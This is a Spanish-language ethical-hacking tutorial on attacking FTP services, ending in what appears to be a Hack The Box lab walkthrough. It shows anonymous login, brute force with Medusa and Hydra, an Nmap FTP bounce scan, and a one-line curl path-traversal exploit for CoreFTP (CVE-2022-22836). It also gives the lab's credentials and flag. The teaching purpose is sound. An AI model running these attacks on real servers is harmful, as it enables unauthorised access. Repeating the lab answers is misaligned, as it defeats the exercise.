
# Ataques a FTP

El [File Transfer Protocol](https://en.wikipedia.org/wiki/File_Transfer_Protocol) (`FTP`) es un protocolo de red estándar que se utiliza para transferir archivos entre computadoras. También realiza operaciones de directorios y archivos, como cambiar el directorio de trabajo, enumerar archivos y cambiar el nombre y eliminar directorios o archivos. De forma predeterminada, FTP escucha en el puerto `TCP/21`.

Para atacar un Servidor FTP podemos abusar de una mala configuración o de privilegios excesivos, explotar vulnerabilidades conocidas o descubrir nuevas vulnerabilidades. Por lo tanto, después de acceder al Servicio FTP, debemos conocer el contenido del directorio para poder buscar información sensible o crítica, como comentamos anteriormente.

El protocolo está diseñado para activar descargas y cargas con comandos. Por tanto, los archivos se pueden transferir entre servidores y clientes. Se pone a disposición del usuario un sistema de gestión de archivos, conocido por el sistema operativo. Los archivos se pueden almacenar en carpetas, que pueden estar ubicadas en otras carpetas. Esto da como resultado una estructura de directorios jerárquica. La mayoría de las empresas utilizan este servicio para procesos de desarrollo de software o sitios web.

***

## <mark style="color:purple;">Enumeración</mark>

Los scripts predeterminados `-sC` de `Nmap` incluyen el script [ftp-anon](https://nmap.org/nsedoc/scripts/ftp-anon.html). Nmap que comprueba si un servidor FTP permite inicios de sesión anónimos. El indicador de enumeración de versiones `-sV` proporciona información interesante sobre los servicios FTP, como el banner FTP, que a menudo incluye el nombre de la versión. Podemos utilizar el cliente `ftp` o `nc` para interactuar con el servicio FTP. De forma predeterminada, FTP se ejecuta en el puerto TCP 21.

**Nmap**

```shell-session
afsh4ck@kali$ sudo nmap -sC -sV -p 21 192.168.2.142 

Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-10 22:04 EDT
Nmap scan report for 192.168.2.142
Host is up (0.00054s latency).

PORT   STATE SERVICE
21/tcp open  ftp
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--   1 1170     924            31 Mar 28  2001 .banner
| d--x--x--x   2 root     root         1024 Jan 14  2002 bin
| d--x--x--x   2 root     root         1024 Aug 10  1999 etc
| drwxr-srwt   2 1170     924          2048 Jul 19 18:48 incoming [NSE: writeable]
| d--x--x--x   2 root     root         1024 Jan 14  2002 lib
| drwxr-sr-x   2 1170     924          1024 Aug  5  2004 pub
|_Only 6 shown. Use --script-args ftp-anon.maxlist=-1 to see all.
```

***

## <mark style="color:purple;">Configuraciones erróneas</mark>

Como comentamos, la autenticación anónima se puede configurar para diferentes servicios como FTP. Para acceder con inicio de sesión anónimo, podemos utilizar el nombre de usuario `anonymous` y sin contraseña. Esto será peligroso para la empresa si no se han configurado correctamente los permisos de lectura y escritura para el servicio FTP. Porque con el inicio de sesión anónimo, la empresa podría haber almacenado información confidencial en una carpeta a la que el usuario anónimo del servicio FTP podría tener acceso.

Esto nos permitiría descargar esta información confidencial o incluso cargar scripts peligrosos. Utilizando otras vulnerabilidades, como el recorrido de ruta en una aplicación web, podríamos averiguar dónde se encuentra este archivo y ejecutarlo como código PHP, por ejemplo.

### **Autenticación anónima**

```shell-session
afsh4ck@kali$ ftp 192.168.2.142    
                     
Connected to 192.168.2.142.
220 (vsFTPd 2.3.4)
Name (192.168.2.142:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0               9 Aug 12 16:51 test.txt
226 Directory send OK.
```

Una vez que obtengamos acceso a un servidor FTP con credenciales anónimas, podremos empezar a buscar información interesante. Podemos usar los comandos `ls`y `cd`para movernos por directorios como en Linux. Para descargar un solo archivo, usamos `get`y para descargar varios archivos, podemos usar `mget`. Para operaciones de carga, podemos usar `put`para un archivo simple o `mput`para múltiples archivos. Podemos utilizarlo `help`en la sesión del cliente FTP para obtener más información.

En el módulo [Enumeración](/ethical-hacking-cheatsheet/recopilacion-de-informacion/enumeracion.md), cubrimos información detallada sobre posibles configuraciones incorrectas de dichos servicios. Por ejemplo, se pueden aplicar muchas configuraciones diferentes a un servidor FTP, y algunas de ellas conducen a diferentes opciones que podrían provocar posibles ataques contra ese servicio. Sin embargo, este módulo se centrará en ataques específicos en lugar de encontrar configuraciones erróneas individuales.

***

## <mark style="color:purple;">Ataques específicos del protocolo</mark>

Muchos ataques y métodos diferentes se basan en protocolos. Sin embargo, es esencial tener en cuenta que no estamos atacando los protocolos individuales en sí, sino los servicios que los utilizan. Dado que existen decenas de servicios para un solo protocolo y procesan la información correspondiente de forma diferente, veremos algunos.

## **Fuerza bruta**

Si no hay autenticación anónima disponible, también podemos forzar el inicio de sesión en los servicios FTP utilizando una lista de nombres de usuario y contraseñas generados previamente. Existen muchas herramientas diferentes para realizar un ataque de fuerza bruta. Exploremos uno de ellos, [Medusa](https://github.com/jmk-foofus/medusa) . Con `Medusa`, podemos usar la opción `-u` para especificar un único usuario al que apuntar, o puede usar la opción `-U` para proporcionar un archivo con una lista de nombres de usuarios. La opción `-P` es para un archivo que contiene una lista de contraseñas. Podemos usar la opción `-M` y el protocolo al que nos dirigimos (FTP) y la opción `-h` para el nombre de host o dirección IP de destino.

{% hint style="info" %}
**Nota**: Aunque podemos encontrar servicios vulnerables a la fuerza bruta, la mayoría de las aplicaciones actuales previenen este tipo de ataques. Un método más eficaz es el Password Spraying
{% endhint %}

### **Fuerza bruta con Medusa**

```shell-session
afsh4ck@kali$ medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp 
                                                             
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>                                                      
ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: 123456 (1 of 14344392 complete)
ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: 12345 (2 of 14344392 complete)
ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: 123456789 (3 of 14344392 complete)
ACCOUNT FOUND: [ftp] Host: 10.129.203.7 User: fiona Password: family [SUCCESS]
```

### **FTP Bounce Attack**

Un ataque FTP Bounce es un ataque de red que utiliza servidores FTP para entregar tráfico saliente a otro dispositivo de la red. El atacante utiliza un comando `PORT` para engañar a la conexión FTP para que ejecute comandos y obtenga información de un dispositivo distinto del servidor previsto.

Considere que estamos apuntando a un servidor FTP `FTP_DMZ` expuesto a Internet. Otro dispositivo dentro de la misma red `Internal_DMZ` no está expuesto a Internet. Podemos utilizar la conexión al servidor `FTP_DMZ` para escanear `Internal_DMZ` mediante el ataque FTP Bounce y obtener información sobre los puertos abiertos del servidor. Luego, podemos usar esa información como parte de nuestro ataque contra la infraestructura.

<figure><img src="/files/SNMR2yHapDKAZZ9ZeLCO" alt=""><figcaption></figcaption></figure>

{% embed url="<https://www.geeksforgeeks.org/what-is-ftp-bounce-attack/>" %}

Con nmap podemos usar la opción `-b`  para realizar un ataque de rebote FTP:

```shell-session
afsh4ck@kali$ nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2

Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-27 04:55 EDT
Resolved FTP bounce attack proxy to 10.10.110.213 (10.10.110.213).
Attempting connection to ftp://anonymous:password@10.10.110.213:21
Connected:220 (vsFTPd 3.0.3)
Login credentials accepted by FTP server!
Initiating Bounce Scan at 04:55
FTP command misalignment detected ... correcting.
Completed Bounce Scan at 04:55, 0.54s elapsed (1 total ports)
Nmap scan report for 172.17.0.2
Host is up.

PORT   STATE  SERVICE
80/tcp open http

<SNIP>
```

***

## <mark style="color:purple;">Últimas vulnerabilidades FTP</mark>

Al analizar las vulnerabilidades más recientes, centraremos esta sección y las siguientes en uno de los ataques mostrados anteriormente y lo presentaremos de la manera más simple posible sin entrar en demasiados detalles técnicos. Esto debería ayudarnos a facilitar el concepto de ataque a través de un ejemplo relacionado con un servicio específico para lograr una mejor comprensión.

En este caso, discutiremos la vulnerabilidad `CoreFTP before build 727` asignada al [CVE-2022-22836](https://nvd.nist.gov/vuln/detail/CVE-2022-22836) . Esta vulnerabilidad es para un servicio FTP que no procesa correctamente la solicitud `HTTP PUT` y genera una vulnerabilidad `authenticated directory`/ `path traversal,` y `arbitrary file write`. Esta vulnerabilidad nos permite escribir archivos fuera del directorio al que tiene acceso el servicio.

***

## <mark style="color:purple;">El concepto del ataque</mark>

Este servicio FTP utiliza una solicitud HTTP `POST` para cargar archivos. Sin embargo, el servicio CoreFTP permite una `PUT`solicitud HTTP, que podemos usar para escribir contenido en archivos. Echemos un vistazo al ataque según nuestro concepto. El [exploit](https://www.exploit-db.com/exploits/50652) de este ataque es relativamente sencillo y se basa en un único `cURL`comando.

### **Explotación CoreFTP**

```shell-session
afsh4ck@kali$ curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
```

Creamos una `PUT`solicitud HTTP sin formato ( `-X PUT`) con autenticación básica ( `--basic -u <username>:<password>`), la ruta del archivo ( `--path-as-is https://<IP>/../../../../../whoops`) y su contenido ( `--data-binary "PoC."`) con este comando. Además, especificamos el encabezado del host ( `-H "Host: <IP>"`) con la dirección IP de nuestro sistema de destino.

**El concepto de ataque**

![](https://academy.hackthebox.com/storage/modules/116/attack_concept2.png)

En resumen, el proceso real malinterpreta la entrada de la ruta por parte del usuario. Esto hace que se omita el acceso a la carpeta restringida. Como resultado, los permisos de escritura en la solicitud HTTP `PUT` no están adecuadamente controlados, lo que lleva a que podamos crear los archivos que queramos fuera de las carpetas autorizadas. Sin embargo, nos saltaremos la explicación del proceso `Basic Auth` y pasaremos directamente a la primera parte del exploit.

**Recorrido del directorio**

<table data-header-hidden><thead><tr><th width="84"></th><th width="509"></th><th></th></tr></thead><tbody><tr><td><strong>Paso</strong></td><td><strong>Recorrido del directorio</strong></td><td><strong>Concepto de ataques - Categoría</strong></td></tr><tr><td><code>1.</code></td><td>El usuario especifica el tipo de solicitud HTTP con el contenido del archivo, incluidos los caracteres de escape para salir del área restringida.</td><td><code>Source</code></td></tr><tr><td><code>2.</code></td><td>El proceso toma y procesa el tipo modificado de solicitud HTTP, el contenido del archivo y la ruta ingresada por el usuario.</td><td><code>Process</code></td></tr><tr><td><code>3.</code></td><td>La aplicación comprueba si el usuario está autorizado a estar en la ruta especificada. Dado que las restricciones solo se aplican a una carpeta específica, todos los permisos que se le otorgan se omiten cuando sale de esa carpeta mediante el recorrido del directorio.</td><td><code>Privileges</code></td></tr><tr><td><code>4.</code></td><td>El destino es otro proceso que tiene la tarea de escribir el contenido especificado del usuario en el sistema local.</td><td><code>Destination</code></td></tr></tbody></table>

Hasta este punto, hemos omitido las restricciones impuestas por la aplicación usando los caracteres de escape ( `../../../../`) y llegamos a la segunda parte, donde el proceso escribe el contenido que especificamos en un archivo de nuestra elección. Aquí es cuando el ciclo comienza de nuevo, pero esta vez para escribir contenidos en el sistema de destino.

**Escritura de archivos arbitrarios**

<table data-header-hidden><thead><tr><th width="88"></th><th width="514"></th><th></th></tr></thead><tbody><tr><td><strong>Paso</strong></td><td><strong>Escritura de archivos arbitrarios</strong></td><td><strong>Concepto de ataques - Categoría</strong></td></tr><tr><td><code>5.</code></td><td>La misma información que el usuario ingresó se utiliza como fuente. En este caso, el nombre del archivo ( <code>whoops</code>) y el contenido ( <code>--data-binary "PoC."</code>).</td><td><code>Source</code></td></tr><tr><td><code>6.</code></td><td>El proceso toma la información especificada y procede a escribir el contenido deseado en el archivo especificado.</td><td><code>Process</code></td></tr><tr><td><code>7.</code></td><td>Dado que se omitieron todas las restricciones durante la vulnerabilidad de cruce de directorio, el servicio aprueba la escritura del contenido en el archivo especificado.</td><td><code>Privileges</code></td></tr><tr><td><code>8.</code></td><td>El nombre de archivo especificado por el usuario ( <code>whoops</code>) con el contenido deseado ( <code>"PoC."</code>) ahora sirve como destino en el sistema local.</td><td><code>Destination</code></td></tr></tbody></table>

Una vez completada la tarea, podremos encontrar este archivo con el contenido correspondiente en el sistema de destino.

**Objetivo del sistema**

```cmd-session
C:\> type C:\whoops

PoC.
```

***

## <mark style="color:purple;">Caso práctico</mark>

```
Objetivo: 10.129.12.72
```

### Pregunta 1

> ¿En qué puerto se ejecuta el servicio FTP en el host?

```bash
sudo nmap -v -sCV -T5 10.129.12.72      

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 71:08:b0:c4:f3:ca:97:57:64:97:70:f9:fe:c5:0c:7b (RSA)
|   256 45:c3:b5:14:63:99:3d:9e:b3:22:51:e5:97:76:e1:50 (ECDSA)
|_  256 2e:c2:41:66:46:ef:b6:81:95:d5:aa:35:23:94:55:38 (ED25519)
53/tcp   open  domain      ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
139/tcp  open  netbios-ssn Samba smbd 4.6.2
445/tcp  open  netbios-ssn Samba smbd 4.6.2
2121/tcp open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (InlaneFTP) [10.129.12.72]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port2121-TCP:V=7.94SVN%I=7%D=4/23%Time=6627BD55%P=aarch64-unknown-linux
SF:-gnu%r(GenericLines,8B,"220\x20ProFTPD\x20Server\x20\(InlaneFTP\)\x20\[
SF:10\.129\.12\.72\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20more
SF:\x20creative\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20c
SF:reative\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2024-04-23T13:53:45
|_  start_date: N/A
| nbstat: NetBIOS name: ATTCSVC-LINUX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   ATTCSVC-LINUX<00>    Flags: <unique><active>
|   ATTCSVC-LINUX<03>    Flags: <unique><active>
|   ATTCSVC-LINUX<20>    Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|_  WORKGROUP<1e>        Flags: <group><active>
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
```

Vemos que en este host el servicio FTP se ejecuta en el puerto **2121** en vez del puerto 21 que se suele utilizar para FTP.

```
2121/tcp open  ftp
```

### Pregunta 2

> ¿Qué nombre de usuario está disponible para el servidor FTP?

Lo primero que vamos a probar es el login anonymous:

```shell-session
afsh4ck@kali$ ftp 10.129.12.72 2121

Connected to 10.129.12.72.
220 ProFTPD Server (InlaneFTP) [10.129.12.72]
Name (10.129.12.72:kali): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: 
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||13832|)
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 ftp      ftp          1959 Apr 19  2022 passwords.list
-rw-rw-r--   1 ftp      ftp            72 Apr 19  2022 users.list
226 Transfer complete
ftp> 
```

Funciona y conseguimos acceder a los archivos del servidor. Hay 2 listas de usuarios y contraseñas que nos vamos a descargar:

```shell-session
afsh4ck@kali$ ls
passwords.list    users.list
```

Tenemos 1 lista de usuarios y una lista de contraseñas, por lo que vamos a hacer bruteforce al servicio FTP. Por ver un ejemplo distinto al visto en esta sección, vamos a usar hydra:

```shell-session
hydra -L users.list -P passwords.list ftp://10.129.12.72:2121 -t 48

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-04-23 16:25:49
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 48 tasks per 1 server, overall 48 tasks, 2750 login tries (l:11/p:250), ~58 tries per task
[DATA] attacking ftp://10.129.12.72:2121/
[2121][ftp] host: 10.129.12.72   login: robin   password: 7iz4rnckjsduza7
```

Encontramos el usuario y contraseña:

```
User: robin
Pass: 7iz4rnckjsduza7
```

### Pregunta 3

> Utiliza el nombre de usuario descubierto y su contraseña para iniciar sesión a través de SSH y obtener el archivo flag.txt. Envía el contenido como respuesta.

```
ssh robin@10.129.12.72    
                
The authenticity of host '10.129.12.72 (10.129.12.72)' can't be established.
ED25519 key fingerprint is SHA256:HfXWue9Dnk+UvRXP6ytrRnXKIRSijm058/zFrj/1LvY.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.12.72' (ED25519) to the list of known hosts.
robin@10.129.12.72's password: 

$ ls
flag.txt
$ cat flag.txt  
HTB{ATT4CK1NG_F7P_53RV1C3}
$ 
```
